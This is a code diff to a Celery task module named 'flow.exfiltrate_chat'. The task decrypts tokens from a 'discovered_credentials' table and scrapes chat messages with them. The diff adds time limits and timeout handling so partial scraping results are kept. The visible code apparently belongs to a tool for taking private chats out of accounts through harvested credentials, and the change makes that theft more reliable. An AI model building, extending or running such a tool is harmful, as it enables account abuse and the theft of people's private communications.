@@ -8,6 +8,7 @@ from app.services.scraper_srv import scraper_service
 import redis
 from app.core.config import settings
 import logging
+from celery.exceptions import SoftTimeLimitExceeded
 
 logger = logging.getLogger("flow.tasks")
 
@@ -20,7 +21,7 @@ async def async_execute(query_builder):
 # Redis Client for Locking
 redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)
 
-@app.task(name="flow.exfiltrate_chat")
+@app.task(name="flow.exfiltrate_chat", soft_time_limit=2400, time_limit=2500)
 def exfiltrate_chat(cred_id: str):
     """
     1. Decrypt token.
@@ -34,7 +35,11 @@ def exfiltrate_chat(cred_id: str):
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
     
-    return loop.run_until_complete(_exfiltrate_logic(cred_id))
+    try:
+        return loop.run_until_complete(_exfiltrate_logic(cred_id))
+    except SoftTimeLimitExceeded:
+        logger.warning(f"⏰ [Exfil] Soft time limit exceeded for {cred_id}. Saving partial results.")
+        return f"Exfiltration timed out for {cred_id} (partial results may have been saved)."
 
 async def _exfiltrate_logic(cred_id: str):
     logger.info(f"🕵️ [Exfil] Starting process for CredID: {cred_id}")
@@ -84,6 +89,9 @@ async def _exfiltrate_logic(cred_id: str):
         
         logger.info(f"✅ [Exfil] Scraper returned {len(messages)} messages.")
         await broadcaster.send_log(f"✅ Scraped {len(messages)} messages.")
+    except SoftTimeLimitExceeded:
+        logger.warning(f"⏰ [Exfil] Scraping timed out for chat {chat_id}. Continuing with 0 messages.")
+        messages = []
     except Exception as e:
         logger.error(f"❌ [Exfil] Scraper failed: {e}")
         await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
